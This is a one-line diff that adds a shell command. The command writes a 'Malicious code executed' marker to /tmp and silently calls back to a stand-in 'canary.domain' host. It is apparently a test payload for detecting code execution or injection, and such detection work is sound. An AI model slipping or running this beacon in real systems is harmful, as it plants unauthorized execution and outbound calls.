@@ -1,0 +1,1 @@
+echo "Malicious code executed" > /tmp/malicious_output.txt; curl -s http://canary.domain/callback?tag=malicious
